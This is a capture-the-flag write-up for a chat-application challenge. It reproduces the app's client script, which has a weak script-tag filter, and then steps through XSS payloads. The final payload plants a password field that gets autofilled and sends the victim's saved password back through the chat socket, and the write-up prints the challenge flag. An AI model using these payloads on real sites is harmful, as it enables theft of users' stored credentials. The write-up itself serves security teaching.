# Lolchat2 🩸 First Blood
## Author: RaduTek
### Description: yeah, it's back, only better, and now functional :)


Note: This was the funniest of them all.
- We connect to the website and we see a basic interface.
![Welcome](https://i.imgur.com/dgLHgmW.png)

- At first, i thought is just a bait interface and i didn't had to interact with it at all, but i was WRONG.
- I got bored and i was just changing rooms until i joined room ``game``.
- After joining room ``game`` a message popped up:
![Tom](https://i.imgur.com/Usht0VM.png)
- Umm... a bit weird, but maybe if i type something it will trigger a payload.
![Bingow](https://i.imgur.com/4V0RCCC.png)
- BINGO Let's try to make a conversation to see if we get any hints or maybe a story that can help us solve the challenge.
- ![Conversation](https://i.imgur.com/rA4dlOe.png)
- We got some usefull information, but a bit misleading. Like: ``cool website ... cool stuff ... etc``, but we need to focus on ``i think i had a password saved in my browser``.
- Now the question how can we get that password out of his browser? Let's explore the files of the website.

Script.js
```
function addMessage(userId, msg) {
    msg = msg.replace("<script", "nice try"); // fix xss bug
    const chatlog = document.getElementById("chatlog");
    const messageElem = document.createElement("div");
    messageElem.innerHTML = `${userId}: ${msg}`;
    chatlog.appendChild(messageElem);
}

const names = ["john", "tyler", "anne", "dave", "frank", "grace", "bob"];
const rooms = ["hall", "lobby", "general", "party", "game"];

window.chosenRoom = "hall";

function setRooms() {
    const roomSel = document.getElementById("room");
    rooms.forEach((value, idx) => {
        const opt = document.createElement("option");
        opt.text = value;
        roomSel.options.add(opt, idx);
    });

    roomSel.onchange = () => {
        window.chosenRoom = roomSel.value;
        connect();
    };
}

function setName() {
    window.chosenName = names[Math.floor(Math.random() * (names.length - 1))];
    document.getElementById("username").innerHTML = `You are: ${chosenName}`;
}

function connect() {
    if (window.socket) {
        window.socket.disconnect();
    }

    const socket = io({ auth: { name: window.chosenName } });

    socket.on("connect", () => {
        console.log("Connected to server");

        socket.emit("joinRoom", window.chosenRoom);
        addMessage(
            "system",
            window.chosenName + " joined the room " + window.chosenRoom
        );
    });

    socket.on("message", (userId, msg) => {
        addMessage(userId, msg);
    });

    socket.on("activeUsers", (count) => {
        console.log(`Active users: ${count}`);
        document.getElementById(
            "activeUsers"
        ).innerHTML = `Active users: ${count}`;
    });

    socket.on("disconnect", () => {
        console.log("Disconnected from server");
    });

    window.socket = socket;
}

function send(event) {
    event.preventDefault();
    const input = document.getElementById("messageInput");
    const message = input.value;

    if (String(message).includes("<script")) {
        alert("XSS is not allowed");
        return;
    }

    if (message && window.socket) {
        window.socket.emit("sendMessage", { room: window.chosenRoom, message });
        addMessage("you", message);
        input.value = "";
    }
}

document.addEventListener("DOMContentLoaded", function () {
    const urlParams = new URLSearchParams(window.location.search);

    console.log(urlParams);

    if (!urlParams.get("pause")) {
        setName();
        setRooms();
        connect();
    }
});

```
- Hmm.. why he added "xss fix"? Because he is blocking only ``<script>`` tag... Maybe that's a clue of ``XSS``, let's try!
```
Value sent thru chatbox

<img src=x onerror="alert('1')">
```
![Alert](https://i.imgur.com/Zo8Tdac.png)
- Yeesss! Ok, we need to think of a way to write a message for him with ``XSS`` and after we can think of a way to grab the flag.
- In the ``script.js`` we can see the send function let's see if we can use it in our ``XSS`` script.
```
window.socket.emit("sendMessage", { room: window.chosenRoom, message });
```
- Let's send it
```
<img src="x" onerror="window.socket.emit('sendMessage',{room:window.chosenRoom,message:`XSS`})">
```
![XSS](https://i.imgur.com/Q5M7BSf.png)
- WORKS! Ok, now we need to create an input that autocompletes. We know to make that work we need to create a ``<input>`` object with attribute of ``autocomplete=password`` and send the value.
```
<input id="password" type="password" name="password"  autocomplete="password">
<img src="x" onerror="window.socket.emit('sendMessage',{room:window.chosenRoom,message:document.getElementById('password').value})">
```
![flag](https://i.imgur.com/amxNSXO.png)
- And that's how we got the flag!!!!!!
```
CTF{fb5cd02303b8969b75c100ea66d0f6da861eb6ddab14e27e934f1bb175124e09}
```
